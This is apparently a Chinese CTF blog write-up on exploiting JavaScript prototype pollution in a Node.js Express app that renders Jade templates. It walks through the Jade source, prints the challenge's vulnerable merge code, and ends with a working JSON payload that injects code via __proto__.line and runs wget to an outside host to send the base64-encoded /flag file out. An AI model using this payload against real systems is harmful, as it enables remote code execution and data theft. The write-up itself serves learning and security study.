---
title: pwnhub 被污染的Jade
date: 2019-12-30 11:12:03
tags: js
---

题目本身不难，但是比较麻烦的就是两点，一是没给代码，后面怎么merge全靠猜，二是题目的cache严重，中间很多测试都被别人干扰，第一天的下午及其严重，基本上开始很多测试都被别人带跑偏了...

下面我就来梳理一下我的正常思路...

<!--more-->

# 题目开始

首先打开题目是比较简单粗暴的模板渲染，再结合题目不难发现题目是node+jade

![image.png-31.6kB][1]

因为我打开题目已经是下午了，所以基本上打开题目就一直都是报错，大概长这样：

![image.png-79.7kB][2]

基本也没什么好猜了，直接能看出来就是js原型链污染

关于js原型链污染的细节这里就不赘述了，可以看下面两篇文章

 - [https://lorexxar.cn/2018/12/07/codingbreak-wp/#js%E7%89%B9%E6%80%A7](https://lorexxar.cn/2018/12/07/codingbreak-wp/#js%E7%89%B9%E6%80%A7)
 - [https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

顺着这样的思路就可以翻翻看jade的代码看看

# 污染jade

在之前文章中提到，我们可以通过污染object来影响js中没有设置的变量属性，首先我们就需要找一个没有被设置过但是却很重要的变量，形似与：

```
if(x.xxxxx){
    x.xxxxx
}
```

这样的代码在jade中非常多

首先顺着代码流程跟到`lib/index.js` 200行

![image.png-109.8kB][3]

 可以看到这里的body直接拼接进了代码，但是这里body是本身有值的，所以顺着跟下去到149行。

 ![image.png-44.7kB][4]

这里是我的第一个思路，通过控制self，然后污染globals，globals会在addwith中直接被拼接进代码中。

这也是为什么我反复吐槽题目没有给代码...因为这条路在我本地环境里是可以走通的，但是在远程你会喜获一个报错，而且我调试了一晚上也不知道怎么修复这个报错...

没办法，因为这里走不下去，所以只能将self设置为true，往下走别的路。

当我们设置为true时，我们能控制的只有js变量，然后我们逐渐跟下去。

往下跟到`lib/compile.js` 60行

![image.png-69.6kB][5]

然后跟入visit函数

![image.png-45.2kB][6]

到这里不难发现可以覆盖line参数，运气比较好的是，到这里就能执行了，事实上往别的路走还有很多能执行的地方。

到这里jade这部分基本已经完成了，剩下的就是在远程中如何执行。

# 回到远程

在成功执行命令之后我们可以拿到远程的代码

```
const express = require('express');
const path = require('path');

const app = express();
var router = express.Router();

app.set('views', path.join(__dirname, 'views'));
app.engine('jade', require('jade').__express);
app.set("view engine", "jade");

app.use(express.json()).use(express.urlencoded({
    extended: false
}));

const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}
const clone = (a) => {
    return merge({}, a);
}

router.get('/', (req, res, next) => {
    res.render('index', {
        title: 'HTML',
        name: ''
    });
});

router.post('/', (req, res, next) => {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body)
    res.render('index', {
        title: 'HTML',
        name: copybody.name || ''
    });
});

app.use('/', router)

app.listen(3000, () => console.log('Example app listening on port http://127.0.0.1:3000 !'))
```

不难发现出题人强行写了一个merge，把req.body和`{}`合并导致了原型链污染，所以传递的对象不能是name，这也是坑了我开始的一大个问题。

然后就是覆盖globals会导致谜一样的错误

![image.png-82.2kB][7]

最后也没能找到原因，使用第二条路就比较简单了，直接可以执行

```
{"__proto__":{"self":true,"line":"0, \"\" ));global.process.mainModule.constructor._load('child_process').exec(`wget msocp8.ceye.io?$(cat /flag|base64)`, function(){} );jade_debug.unshift(new jade.DebugItem( 0","filename":"test","title":"test","name":"test"}}
```

![image.png-368.3kB][8]


# 写在最后

其实回顾题目还挺有意思的，只是可惜，jade的官方的范例中没有这种merge的操作，但题目又不给出代码，导致本来调试完成的题目成了远程瞎猜了，不过运气比较好的是，这题的利用不太复杂，如果特别复杂的话可能再配合远程cache这题就没法做了...




[1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/8wc6ywckycmqv28jdjxoi9vj/image.png
[2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ywtm8z22g8a5zurlh6wb540u/image.png
[3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/huxieo13n6vdw6cwwkacff9b/image.png
[4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/aw9blbi9xf4f10ivgcodj0z6/image.png
[5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/297sys9curah7u5md4ny9g2y/image.png
[6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/jgn2kebq12an65iz9dhzm6lm/image.png
[7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/aketq6lib1ajm6vb0q7ttijk/image.png
[8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/hqmbmrfm57gxpf8koh6ks11j/image.png